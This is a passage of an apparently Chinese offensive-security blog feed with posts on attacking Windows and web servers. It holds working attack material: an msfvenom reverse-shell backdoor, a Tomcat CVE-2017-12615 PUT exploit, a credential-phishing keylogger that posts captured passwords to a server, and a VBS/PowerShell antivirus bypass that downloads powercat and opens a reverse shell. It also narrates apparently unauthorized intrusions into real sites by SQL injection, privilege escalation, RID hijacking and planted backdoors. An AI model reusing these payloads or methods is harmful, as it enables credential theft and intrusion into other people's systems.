timedef read():    dk=open(&#39;user_agents.txt&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;)    for r in dk.readlines():        data=&quot;&quot;.join(r.split(&#39;\n&#39;))        yield datadef reads():    dk=open(&#39;domain.txt&#39;,&#39;r&#39;,encoding=&#39;utf-8&#39;)    for r in dk.readlines():        data=&quot;&quot;.join(r.split(&#39;\n&#39;))        yield datadef fenpei(proxy,search,page,sleep):    user_agents=[]    google_searchs=[]    for ua in read():        user_agents.append(ua)    for domain in reads():        google_searchs.append(domain)    time.sleep(int(sleep))    proxy={&#39;http&#39;:&#39;http://{}&#39;.format(proxy),&#39;https&#39;:&#39;https://{}&#39;.format(proxy)}    domains=random.choice(google_searchs)    u_s={&#39;user-agent&#39;:random.choice(user_agents),&#39;Content-type&#39;:&quot;text/html;charset=utf-8&quot;}    url=&#39;https://{}/search?hl=Chinese&amp;q={}&amp;btnG=Search&amp;gbv=10&amp;start={}&#39;.format(domains,search,page)    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)    rqt=requests.get(url=url,headers=u_s,allow_redirects=False,verify=False,proxies=proxy,timeout=30)    return rqt.content</code></pre><h2 id="0x002完整代码"><a href="#0x002完整代码" class="headerlink" title="0x002完整代码"></a>0x002完整代码</h2><p>仓库地址：<a href="https://github.com/422926799/note/tree/master/自己写的工具/google抓取" target="_blank" rel="noopener">google抓取</a></p><p>成功抓取如下</p><p><img src="https://camo.githubusercontent.com/715046819fa7b0253960073ecfba3e6e316235fd/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31392f6d33473334412e676966" alt="img"></p><p>遇见验证码</p><p><img src="https://camo.githubusercontent.com/b6becba1632951b8bfe9edc03d3079d06e7d6863/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31392f6d334a4c7a712e706e67" alt="img"></p><p>支持IP代理池</p><p><img src="https://s2.ax1x.com/2019/08/19/m3huWR.png" alt="1566216110255"></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一次绕过aspx禁止执行命令</title>
      <link href="/posts/2f92e5fe.html"/>
      <url>/posts/2f92e5fe.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某友扔了个zhan给我，叫我帮他提。后面遇到不能执行命令的问题，百度上的试了之后发现也不行。后面问了su su，叫我执行powershell，后面折腾了一会解决了能执行命令的问题。<br><img src="http://n.sinaimg.cn/sinacn/w600h351/20180127/b432-fyqzcxh2255594.jpg" alt="小丑"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>执行命令如下返回<br><img src="https://s2.ax1x.com/2019/08/16/me0TL4.png" alt="无法执行命令"></p><p>根据某文章执行操作<br><a href="https://blog.csdn.net/weixin_33860722/article/details/89898941" target="_blank" rel="noopener">关于webshell中的cmd的权限提升</a></p><p>最后面还是无法执行，后面去问susu。让我操作一波powershell看看，后面我就用</p><pre><code>ngrok+msf反弹到本地</code></pre><p>生成apsx的后门</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;ngrok的IP&gt; LPORT=&lt;ngrok的端口&gt; -f aspx &gt; demo.aspx</code></pre><p><img src="https://s2.ax1x.com/2019/08/16/meDPjU.png" alt="ngrok反弹"></p><p>msf接收到shell之后，</p><pre><code>load powershell</code></pre><p><img src="https://s2.ax1x.com/2019/08/16/me6fY9.png" alt="powershell"></p><p>可以执行powershell里的命令，尝试执行cs生成的powershell command,还是不行<br><img src="https://s2.ax1x.com/2019/08/16/mect6x.png" alt="失败"></p><p>后面用cs生成了一个ps1，上传到shell目录下。然后用ps执行脚本<br><img src="https://s2.ax1x.com/2019/08/16/mmmRMT.png" alt="反弹到cs"></p><p>cobalstrike<br><img src="https://s2.ax1x.com/2019/08/16/me2rQI.png" alt="me2rQI.png"></p><p>后面回到cs发现还是不能执行命令，后面尝试注入到其他进程回连看看能不能执行命令，没想到真的可以（由于当时没有截图，这里就说一下要注意的）</p><p>要注意的是，要<code>注入一个 x64位的进程，而且不能是当前用户名的进程即可</code></p><p><img src="https://s2.ax1x.com/2019/08/16/mmmrIs.png" alt="mmmrIs.png"></p><p>后面在菜刀中翻到管理员添加的账号<br><img src="https://s2.ax1x.com/2019/08/16/mmnZwQ.png" alt="mmnZwQ.png"></p>]]></content>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-12615复现</title>
      <link href="/posts/310ec487.html"/>
      <url>/posts/310ec487.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久没复现过vulhub里的漏洞了，昨天晚上复现了一个。现在记录一下<br>复现的是CVE+2017-12615<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565854600085&amp;di=5b63faebe1996522c2caa0354ef8fc2c&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F15%2F20150515230612_PxwH2.thumb.700_0.jpeg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565854600085&amp;di=5b63faebe1996522c2caa0354ef8fc2c&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201505%2F15%2F20150515230612_PxwH2.thumb.700_0.jpeg"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>利用条件：</p><pre><code>Apache Tomcat允许PUT上传允许写入文件</code></pre><p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a></p><p>进入对应的文件夹执行</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p><img src="https://s2.ax1x.com/2019/08/15/mA7etU.png" alt="mA7etU.png"></p><p>访问如下<br><img src="https://s2.ax1x.com/2019/08/15/mA7thD.png" alt="mA7thD.png"></p><p>开burp刷新发送POC</p><pre><code>PUT /1.jsp/ HTTP/1.1Host: your-ip:8080Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 5shell</code></pre><p>返回状态码为201即为上传成功<br><img src="https://s2.ax1x.com/2019/08/15/mA7Wcj.png" alt="mA7Wcj.png"></p><p>构造exp</p><pre><code class="python">rqt=requests.put(url=url+&#39;{}&#39;.format(self.path),data=self.data,headers=self.headers,timeout=3)if rqt.status_code==201:    print(&#39;[+] getshell成功:{}&#39;.format(rqt.url))    print(&#39;[+] getshell成功:{}&#39;.format(rqt.url),file=open(&#39;save.txt&#39;,&#39;a&#39;))</code></pre><p>代码地址：<a href="https://github.com/422926799/python/tree/master/CVE-2017-12615" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/CVE-2017-12615</a></p><p>效果不咋滴，估计都修复了。从fofa爬了60页没一个成的<br><img src="https://s2.ax1x.com/2019/08/15/mAHAvd.png" alt="mAHAvd.png"></p><p><img src="https://s2.ax1x.com/2019/08/15/mAHnVP.png" alt="mAHnVP.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows凭证钓鱼</title>
      <link href="/posts/1441cb97.html"/>
      <url>/posts/1441cb97.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看见WBG老哥通过powershell来记录，windows凭证登录的用户名的和密码<br>当时就我凑了，看完gif后自己也想写一个<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565699852904&amp;di=73af6fe7fb5650178fcc87f189f65330&amp;imgtype=0&amp;src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2Ff%2F5744232793d1a.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1565699852904&amp;di=73af6fe7fb5650178fcc87f189f65330&amp;imgtype=0&amp;src=http%3A%2F%2Fpic1.win4000.com%2Fwallpaper%2Ff%2F5744232793d1a.jpg"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>需要用到的库：</p><pre><code>pyHookpywin32pycomrequests</code></pre><p>仓库地址：<br><a href="https://github.com/422926799/python/tree/master/windows%E5%87%AD%E8%AF%81%E6%8D%95%E8%8E%B7" target="_blank" rel="noopener">python/windows凭证捕获 at master · 422926799/python · GitHub</a></p><p>思路：</p><pre><code>弹出一个MSgbox提升用户凭证过期执行powershell命令要求输入凭证寻找到该窗体记录下键盘的输入发送到远程服务器</code></pre><p>代码：</p><pre><code class="python">#@author:#@file:main.pyimport pythoncom, pyHookimport pyHookfrom ctypes import *import requestsimport win32apiimport win32conimport osimport threadingwin32api.MessageBox(0,&quot;Windows凭证失效&quot;,&quot;Windows Error&quot;,win32con.MB_ICONERROR)os.popen(r&#39;&#39;&#39;powershell iex &quot;$creds = $host.ui.PromptForCredential(\&quot;Login Required\&quot;,\&quot;Enter username and password.\&quot;, \&quot;$env:username\&quot;,\&quot;NewBiosUserName\&quot;);&quot;&#39;&#39;&#39;)print(&#39;[+] windows凭证捕获&#39;)passwd=[]def OnKeyboardEvent(event):    windowTitle=create_string_buffer(512)    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512) #从窗体中获得窗体的title    windowname=windowTitle.value.decode(&#39;gbk&#39;)    if &#39;Login Required&#39;==windowname: #判断是否为登录窗体        key=chr(event.Ascii)        if key!=&#39;&#39;:            print(&#39;{}&#39;.format(key),end=&#39;&#39;)            passwd.append(key)        elif len(key)==0:            print(&#39;\n&#39;)# return True to pass the event to other handlers    return Truedef run():    # create a hook manager    hm = pyHook.HookManager()    # watch for all mouse events    hm.KeyDown = OnKeyboardEvent #设置事件过滤    # set the hook    hm.HookKeyboard()    # wait forever    print(&#39;键盘输入:&#39;)    pythoncom.PumpMessages()if __name__ == &#39;__main__&#39;:    t=threading.Thread(target=run,args=())    t.setDaemon(True)    t.start()    t.join(10)    for j in passwd:        if str(j)==&#39;\x00&#39; or str(j)==&#39;\t&#39;:            pass        else:            rqt=requests.get(url=&#39;http://127.0.0.1/jieshou.php?password={}&#39;.format(str(j)),headers={&#39;user-agent&#39;:&#39;nb&#39;}) #发送到远程服务器</code></pre><p>效果图<br><img src="https://camo.githubusercontent.com/4bae8e67d066491583907c9a13c870955120e9e2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31332f6d70686575642e676966" alt="68747470733a2f2f73322e617831782e636f6d2f323031392f30382f31332f6d70686575642e676966"></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从sql注入到日下整个服务器</title>
      <link href="/posts/709141a4.html"/>
      <url>/posts/709141a4.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Zoomeye瞎几把搜后台，看看能不能碰到几个弱口令 ，扔到CNVD提交<br><img src="https://s2.ax1x.com/2019/08/07/e40Jm9.png" alt="e40Jm9.png"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>打开IP一看，我草 棋牌登录<br><img src="https://s2.ax1x.com/2019/08/07/e40YwR.md.png" alt="e40YwR.md.png"></p><p>随便输入什么admin admin之类的，发现密码 不对<br><img src="https://s2.ax1x.com/2019/08/07/e40tT1.md.png" alt="e40tT1.md.png"></p><p>输入admin‘，发现没有回显错误<br><img src="https://s2.ax1x.com/2019/08/07/e40dfK.md.png" alt="e40dfK.md.png"></p><p>输入个万能密码发现又返回了错误<br><img src="https://s2.ax1x.com/2019/08/07/e40BlD.md.png" alt="e40BlD.md.png"></p><p>burp抓包扔sqlmap跑了一波，然后发现存在注入，盲注，mssql<br><img src="https://s2.ax1x.com/2019/08/07/e40ymd.md.png" alt="e40ymd.md.png"></p><p>确认是windows server 2008的系统</p><p>查询一下是不是dba权限，发现是<br><img src="https://s2.ax1x.com/2019/08/07/e402kt.md.png" alt="e402kt.md.png"></p><p>那么当前用户肯定是sa用户了<br><img src="https://s2.ax1x.com/2019/08/07/e4041S.png" alt="e4041S.png"></p><p>查询一下密码，发现回显出的更本不是密码…而是数据库的用户<br><img src="https://s2.ax1x.com/2019/08/07/e4070s.png" alt="e4070s.png"></p><p>查询当前数据库，然后跑出了管理员密码<br><img src="https://s2.ax1x.com/2019/08/07/e40jpT.png" alt="e40jpT.png"></p><p><img src="https://s2.ax1x.com/2019/08/07/e40zX4.png" alt="e40zX4.png"></p><p>然后md5解不出，脱airen去CMD5掏了出明文<br><img src="https://s2.ax1x.com/2019/08/07/e4BpnJ.png" alt="e4BpnJ.png"></p><p>登进后台看了一下，坑人玩意啊<br><img src="https://s2.ax1x.com/2019/08/07/e4BC7R.png" alt="e4BC7R.png"></p><p>然后找了一下后台功能，发现没的上传shell的地方<br><img src="https://s2.ax1x.com/2019/08/07/e4BQAI.png" alt="e4BQAI.png"></p><p>寻思了一下，决定用后台密码猜一下是不是sa用户的密码，Boom!<br><img src="https://s2.ax1x.com/2019/08/07/e4BlNt.png" alt="e4BlNt.png"></p><p>还真的连上了，我日，执行一波<code>exec master.dbo.xp_cmdshell</code>,发现sa用户被降权了<br><img src="https://s2.ax1x.com/2019/08/07/e4BRb9.md.png" alt="e4BRb9.md.png"></p><p>查询了一波进程，发现并没有杀软<br><img src="https://s2.ax1x.com/2019/08/07/e4BfER.png" alt="e4BfER.png"></p><p>用户只有最初始的两个<br><img src="https://s2.ax1x.com/2019/08/07/e4B44x.png" alt="e4B44x.png"></p><p>管理员组没改名<br><img src="https://s2.ax1x.com/2019/08/07/e4BIC6.md.png" alt="e4BIC6.md.png"></p><p>cs生成ps，用exec master.dbo.xp_cmdshell来执行获取会话<br><img src="https://s2.ax1x.com/2019/08/07/e4Bo8K.png" alt="e4Bo8K.png"></p><p>查询了一波补丁<br><img src="https://s2.ax1x.com/2019/08/07/e4BTgO.md.png" alt="e4BTgO.md.png"></p><p>后面由于cs上传exp上传不成功，派会话到本机的msf，ngrok启动<br><img src="https://s2.ax1x.com/2019/08/07/e4BbKe.png" alt="e4BbKe.png"></p><p><img src="https://s2.ax1x.com/2019/08/07/e4BqDH.png" alt="e4BqDH.png"></p><p>cs的监听设置为ngrok的IP和端口<br><img src="https://s2.ax1x.com/2019/08/07/e4D9xS.png" alt="e4D9xS.png"></p><p><img src="https://s2.ax1x.com/2019/08/07/e4DV5q.png" alt="e4DV5q.png"></p><p>成功接收到会话<br><img src="https://s2.ax1x.com/2019/08/07/e4BLbd.md.png" alt="e4BLbd.md.png"></p><p>使用模块查询了一波能提权利用的操作<br><img src="https://s2.ax1x.com/2019/08/07/e4DPKg.png" alt="e4DPKg.png"></p><p>试了几个exp模块没成功，然后看到上次提权用的MS16-075，反手就试了一遍，然后提下来了<br><img src="https://s2.ax1x.com/2019/08/07/e4DFbj.png" alt="e4DFbj.png"></p><p><img src="https://s2.ax1x.com/2019/08/07/e4DAVs.png" alt="e4DAVs.png"></p><p>添加用户一系列操作<br><img src="https://s2.ax1x.com/2019/08/07/e4DeP0.png" alt="e4DeP0.png"></p><p><img src="https://s2.ax1x.com/2019/08/07/e4DmGV.png" alt="e4DmGV.png"></p><p>激活Guest用户用于做RID劫持<br><img src="https://s2.ax1x.com/2019/08/07/e4Dn2T.png" alt="e4Dn2T.png"></p><p>最后成功获取到管理员所有数据，控制整台服务器<br><img src="https://s2.ax1x.com/2019/08/07/e4DQr4.md.png" alt="e4DQr4.md.png"></p><p>留下个后门走人<br><img src="https://s2.ax1x.com/2019/08/07/e4DlqJ.png" alt="e4DlqJ.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在webshell下使用AnyDesk进行远程桌面连接</title>
      <link href="/posts/6b1dcf8a.html"/>
      <url>/posts/6b1dcf8a.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34040720&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几日看见圈子某文章，在webshell下使用Anydesk连接远程桌面<br><img src="https://s2.ax1x.com/2019/08/06/eWXpSU.md.png" alt="eWXpSU.md.png"></p><p>原文：<a href="https://secquan.org/Notes/1069995" target="_blank" rel="noopener">Webshell下使用Anydesk连接远程桌面</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>两台windowsWindow server 2008: 192.168.241.129本机: 192.168.3.4</code></pre><p>首先下载Anydesk<br><a href="https://anydesk.com/zhs" target="_blank" rel="noopener">快速远程桌面应用程序 – AnyDesk</a></p><p>在本机中运行，然后点击设置，为自主访问设置密码<br><img src="https://s2.ax1x.com/2019/08/06/eWXYff.png" alt="eWXYff.png"></p><p>记录下ID和密码，然后从以下路径中找打配置文件将其剪切出来</p><pre><code>C:\Users\{username}\AppData\Roaming\AnyDesk</code></pre><p><img src="https://s2.ax1x.com/2019/08/06/eWXa6g.png" alt="eWXa6g.png"></p><p>移动到H盘<br><img src="https://s2.ax1x.com/2019/08/06/eWXskq.md.png" alt="eWXskq.md.png"></p><p>打开shell，上传Anydesk，然后运行一遍Anydesk，然后在kill掉，在进入到<code>C:\Users\{username}\AppData\Roaming\AnyDesk</code>路径删除掉原来的配置文件，然后在上传剪切出来的配置文件</p><p><img src="https://s2.ax1x.com/2019/08/06/eWX7h6.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/08/06/eWjSAI.png" alt=""></p><p>在本地运行AnyDesk输入刚刚记录下的IP和你设置的密码即可成功连接<br><img src="https://s2.ax1x.com/2019/08/06/eWjZHs.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 骚操作 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一次玄学提权</title>
      <link href="/posts/589f1dca.html"/>
      <url>/posts/589f1dca.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某友扔了个shell给我，问我能不能提权，故事就这么开始了<br><img src="https://s2.ax1x.com/2019/08/03/esZdKS.png" alt="esZdKS.png"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>菜刀连上一看，权限小的可怕<br><img src="https://s2.ax1x.com/2019/08/03/esZ2vT.png" alt="esZ2vT.png"></p><p>查看一波补丁</p><pre><code>systeminfo</code></pre><p><img src="https://s2.ax1x.com/2019/08/03/esZo5R.png" alt="esZo5R.png"></p><p>查看一下用户名</p><pre><code>net user</code></pre><p><img src="https://s2.ax1x.com/2019/08/03/esZH8x.png" alt="esZH8x.png"></p><p>查看一下administrators组</p><pre><code>net localgroup administrators</code></pre><p><img src="https://s2.ax1x.com/2019/08/03/esZXrD.png" alt="esZXrD.png"></p><p>将刚刚的补丁号扔去提权辅助页面查一手exp<br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助网页</a></p><p><img src="https://s2.ax1x.com/2019/08/03/eseCGt.md.png" alt="eseCGt.md.png"></p><p>试一波exp后发行不行，ngrok+msf获取meterpreter</p><pre><code>./ngrok tcp 4444</code></pre><p><img src="https://s2.ax1x.com/2019/08/03/eseeaj.png" alt="eseeaj.png"></p><p>得到meterpreter,反手就试一波getsystem,不行<br><img src="https://s2.ax1x.com/2019/08/03/eseMR0.md.png" alt="eseMR0.md.png"></p><p>选择<code>/recon/local_exploit_suggester</code>模块获取一波能利用的exp,这里懒就不截图了<br>模块用法参考:<a href="https://422926799.github.io/posts/80762752.html" target="_blank" rel="noopener">https://422926799.github.io/posts/80762752.html</a></p><p>得到一个名为<code>MS16-075</code>的exp，用msf的试了一手，发现不行，可能是我操作错了<br><img src="https://s2.ax1x.com/2019/08/03/eseyee.png" alt="eseyee.png"></p><p>然后去找exp来使<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" rel="noopener">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits · GitHub</a></p><p>然后第一次用的时候贼玄学，明明都已经出来了system。就是伪造不了令牌，后面一看又没了system用户<br><img src="https://s2.ax1x.com/2019/08/03/ese7wQ.png" alt="ese7wQ.png"></p><p>隔几分钟后在试了一遍，提下来了<br><img src="https://s2.ax1x.com/2019/08/03/eseOWq.png" alt="eseOWq.png"></p><p>反手加用户加入administrator组<br><img src="https://s2.ax1x.com/2019/08/03/esmik9.png" alt="esmik9.png"></p><p>反手查询RDP端口<br><img src="https://s2.ax1x.com/2019/08/03/esmJ6f.png" alt="esmJ6f.png"></p><p>反手登录RDP，然后加个RID劫持获取管理员全部数据<br><img src="https://s2.ax1x.com/2019/08/03/esmU0g.md.png" alt="esmU0g.md.png"></p><p>RID劫持重新登录RDP<br><img src="https://s2.ax1x.com/2019/08/03/esmTc6.md.png" alt="esmTc6.md.png"></p><p>加入cs<br><img src="https://s2.ax1x.com/2019/08/03/esmLHe.png" alt="esmLHe.png"></p><p>加个开机自启<br><img src="https://s2.ax1x.com/2019/08/03/esnPu8.md.png" alt="esnPu8.md.png"></p><p>持久后门文章请参考：<a href="https://422926799.github.io/posts/26a6c441.html" target="_blank" rel="noopener">持久化控制学习 | 九世的博客</a></p><p>完</p>]]></content>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vbs绕过360用ps1反弹shell</title>
      <link href="/posts/93654a0e.html"/>
      <url>/posts/93654a0e.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593520&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中午开始想从360手上搞点好果汁吃。奈何360太流氓，一句拦截行天下<br><img src="https://s2.ax1x.com/2019/07/28/elTVeI.png" alt="elTVeI.png"></p><h2 id="得出来的结果"><a href="#得出来的结果" class="headerlink" title="得出来的结果"></a>得出来的结果</h2><pre><code>360不拦截本机执行powershell，但是拦截其他进程调用powershellcmd也是一个道理是先执行被拦截的进程，被检测到然后360结束进程vbs下载只有下载保存的文件后缀不为hta、exe就不会被拦截,可以保存为txt、ps1有360的机子，不能将文件重命名为exe、hta但是，用系统本身存在的功能进行远程下载它会拦截，用第三方的远程下载器并不会拦截360对powershell拦截的不是内容，拦截的是参数</code></pre><p>ijps1</p><pre><code class="powershell">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.241.147 -p 4445 -e cmd</code></pre><p>vbs</p><pre><code class="c#">Set post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)post.Open &quot;GET&quot;,&quot;http://192.168.3.4/ij.ps1&quot;&#39;发送请求post.Send()Set aGet = CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode = 3aGet.Type = 1aGet.Open()&#39;等待3秒，等文件下载wscript.sleep 3000 aGet.Write(post.responseBody)&#39;写数据aGet.SaveToFile &quot;ij.ps1&quot;,2set ws=wscript.createobject(&quot;wscript.shell&quot;)ret=ws.run (&quot;powershell -nologo -file ij.ps1&quot; ,3,true)</code></pre><p>测试结果：<br><img src="https://s2.ax1x.com/2019/07/28/elTNkV.gif" alt="elTNkV.md.gif"></p><p>PS:绕过是绕过，但是是落地执行</p><p>py下载器</p><pre><code class="python">import requestsimport optparseimport osclass zx(object):    def __init__(self,command):        self.command=command    def __call__(self,zx):        def wt(*args,**kwargs):            print(&#39;[+] 开始下载&#39;)            try:                rqt=requests.get(url=args[0],headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#39;},timeout=3)                global value                value=len(rqt.content)                dk=open(args[1],&#39;wb&#39;)                dk.write(rqt.content)                dk.close()            except:                pass            if os.path.exists(args[1]):                jd=len(open(args[1],&#39;rb&#39;).read())                if jd==value:                    print(&#39;[+] 文件:{}下载成功&#39;.format(args[1]))                else:                    print(&#39;[-] 文件:{}下载失败，失败原因:大小不一致&#39;.format(args[1]))            else:                print(&#39;[-] 文件下载失败&#39;)            return zx(*args,**kwargs)        return wt@zx(command=&#39;calc&#39;)def download(url,file):    passdef demo():    usage=&#39;download.py -u [url] -s [save_filename]&#39;    parsersq=optparse.OptionParser(usage)    parsersq.add_option(&#39;-u&#39;,dest=&#39;url&#39;,help=&#39;指定要下载的URL路径&#39;)    parsersq.add_option(&#39;-s&#39;,dest=&#39;file_name&#39;,help=&#39;保存为什么名称&#39;)    (options,args)=parsersq.parse_args()    if options.url and options.file_name:        download(options.url,options.file_name)    else:        parsersq.print_help()        exit()if __name__ == &#39;__main__&#39;:    demo()</code></pre><p>结果：<br><img src="https://s2.ax1x.com/2019/07/28/elTbAP.png" alt="elTbAP.png"></p><p>360并没有拦截</p><h3 id="由于有些事情要做，晚上我会把windows10的测试补上"><a href="#由于有些事情要做，晚上我会把windows10的测试补上" class="headerlink" title="由于有些事情要做，晚上我会把windows10的测试补上"></a>由于有些事情要做，晚上我会把windows10的测试补上</h3><p>windows10的话估计可以不落地…</p>]]></content>
      
      
        <tags>
            
            <tag> 红队实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一次浪荡的渗透2</title>
      <link href="/posts/7e2a8d8d.html"/>
      <url>/posts/7e2a8d8d.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593530&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看了freebuf某篇文章想试验一下，上网找了几个站。然后发现这个站有SQL注入就顺手拿下了<br><img src="https://s2.ax1x.com/2019/07/27/eM5mdO.png" alt="eM5mdO.png"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>由于那个站已经死了，我当时没截图。就简单描述一下当时的情况。大约在找回用户名处插入了’发现有SQL注入<br><img src="https://s2.ax1x.com/2019/07/27/eMIAhQ.png" alt="eMIAhQ.png"></p><p>POST抓包扔sqmap一套带走<br><img src="https://s2.ax1x.com/2019/07/27/eMID4e.png" alt="eMID4e.png"></p><p>sqlmap<br><img src="https://s2.ax1x.com/2019/07/27/eMI6gA.png" alt="eMI6gA.png"></p><p>后面看到有个叫ftpmg的数据库，当时就觉得这是FTP的用户名和密码，就先跑了出来<br><img src="https://s2.ax1x.com/2019/07/27/eMTBSH.png" alt="eMTBSH.png"></p><p>由于数据库的权限是dba权限，把用户名和密码也跑了<br><img src="https://s2.ax1x.com/2019/07/27/eMTRk8.png" alt="eMTRk8.png"></p><p>虽然知道数据库密码，但是mysql不允许外连<br><img src="https://s2.ax1x.com/2019/07/27/eMTb7V.png" alt="eMTb7V.png"></p><p>也不知道物理路径，没办法os-shell，后面就跑了一下这个站的数据库，打算进后台<br><img src="https://s2.ax1x.com/2019/07/27/eM7SXR.png" alt="eM7SXR.png"></p><p>问题是，md5一个也查不出来<br><img src="https://s2.ax1x.com/2019/07/27/eM79n1.jpg" alt="eM79n1.jpg"></p><p>7kb的扫描工具就扫出一个robots.txt..<br><img src="https://s2.ax1x.com/2019/07/27/eM79n1.jpg" alt="eM79n1.jpg"></p><p>无计可施的试了一下ftp，我草还真登录上去了<br><img src="https://s2.ax1x.com/2019/07/27/eM7V9e.png" alt="eM7V9e.png"></p><p>找到站点根目录，二话不说扔了个shell上去，菜刀链接<br><img src="https://s2.ax1x.com/2019/07/27/eM734S.png" alt="eM734S.png"></p><p>一查权限system<br><img src="https://s2.ax1x.com/2019/07/27/eM5mdO.png" alt="eM5mdO.png"></p><p>打了200多个补丁…<br><img src="https://s2.ax1x.com/2019/07/27/eMHEV0.png" alt="eMHEV0.png"></p><p>添加用户+RID劫持获取管理员全部数据<br><img src="https://s2.ax1x.com/2019/07/27/eMHVaV.md.png" alt="eMHVaV.md.png"></p><p>查了一下这个站的旁站居然是搞棋牌的….<br><img src="https://s2.ax1x.com/2019/07/27/eMHXQJ.md.png" alt="eMHXQJ.md.png"></p><p>微步查了一下<br><img src="https://s2.ax1x.com/2019/07/27/eMbnTP.png" alt="eMbnTP.png"></p>]]></content>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux辅助提权</title>
      <link href="/posts/b406cd6c.html"/>
      <url>/posts/b406cd6c.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593515&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天整理链接并发公众号的时候发现了，一个辅助Linux提权的shell脚本。看了也行还行，那么我也写一个好了<br><img src="http://pic.netbian.com/uploads/allimg/190409/232118-1554823278d145.jpg" alt="232118-1554823278d145.jpg"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="shell">#!/bin/bashecho &quot;A B C D E F G H I J K L N M&quot;jiet(){    echo &quot;是否查询执行[1]/[2]&quot;    read gsrc    if test $gsrc  -eq &quot;1&quot;    then        clear        runs    elif test ${#gsrc} -eq &quot;0&quot;    then        clear        runs    else        echo &quot;[!] 退出....&quot;        exit 0        fi}fshell(){    echo 